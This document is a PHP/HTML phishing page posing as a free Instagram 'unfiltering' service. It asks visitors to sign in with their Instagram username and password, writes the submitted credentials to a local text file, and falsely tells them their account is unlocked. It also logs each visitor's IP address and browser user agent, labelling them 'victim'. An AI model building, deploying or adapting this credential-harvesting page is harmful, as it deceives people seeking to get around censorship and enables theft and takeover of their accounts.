<?php
?>
<!DOCTYPE html>
<html lang="En" dir="ltr">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Get Free Unfiltering Instagram</title>
    <link rel="stylesheet" href="css/bootstrap.min.css"/>
    <link rel="stylesheet" href="css/uikit.min.css"/>
</head>
<body class="bg-light bg-gradient">
    <header class="justify-content-center align-items-center text-center bg-primary p-2">
        <h1 class="h2 text-light">Get Free UnFiltering Instagram Account From This site</h1>
    </header>
    <main>
        <article class="container container-fluid mt-2 justify-content-center align-items-center text-center">
            <li>
                <i class="h3 text-primary"><strong>How can i get free Un-Filtering with this site?</strong>
                </i>
            </li>
            <li>
                <i class="h5"><strong>Step 1: Open your internet explorer and visit this site.</strong></i>
            </li>
            <li>
                <i class="h5"><strong>Step 2: Sign in to your instagram account.</strong></i>
            </li>
            <li>
                <i class="h5"><strong>Step 3: Now your account has been unlocked from filtering.</strong></i>
            </li>
        </article>
        <aside class="justify-content-center align-items-center container container-fluid mt-5 rounded rounded-3">
            <form action="https://instagram.com/login/" method="post" class="">
                <label for="username" class="form-label ms-lg-5 mt-3">Username: </label>
                <input type="text" name="username" id="username" class="input-group-text ms-lg-5 mt-1 pe-5"/>

                <label for="password" class="form-label ms-lg-5 mt-3">Password: </label>
                <input type="password" class="input-group-text ms-lg-5 mt-1 pe-5" id="password" name="password"/>

                <input type="submit" class="btn btn-primary mt-3 ms-lg-5" value="Sign in"/>
            </form>
            <?php
                 if (isset($_POST['username']) && !empty($_POST['username']))
                 {
					 $username = $_POST['username'];
					 if (isset($_POST['password']) && !empty($_POST['password']))
					 {
						 $password = $_POST['password'];
						//$file = fopen('log.txt', 'a');
						//fwrite($file, "Username:".$_POST['username']."   Password:".$_POST['password']."    Info:".$information."    Zone:".$zone);
						//fclose($file);
						 file_put_contents("user.txt", "Username: ".$username."    Password: ".$password."\n", FILE_APPEND);
						 echo "<p><strong>Mail sended to instagram. Now Enjoy Instagram without filtering</strong></p>";
					 }
                 }
            ?>
            <?php
                if (!empty($_SERVER['HTTP_CLIENT_IP']))
                {
                    $ip_address = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
                }
                else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
                {
                    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
                }
                else
                {
                    $ip_address = $_SERVER['REMOTE_ADDR']."\r\n";
                }
                $user_agent = " User Agent: ";
                $browser = $_SERVER['HTTP_USER_AGENT'];

                $files = "information.txt";
                $victim = "IP: ";
                $fp = fopen($files, "a");

                fwrite($fp, $victim);
                fwrite($fp, $ip_address);
                fwrite($fp, $user_agent);
                fwrite($fp, $browser);

                fclose($fp);
            ?>
            <script>

            </script>
        </aside>
    </main>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/uikit.min.js"></script>
    <script src="js/uikit-icons.min.js"></script>
</body>
</html>
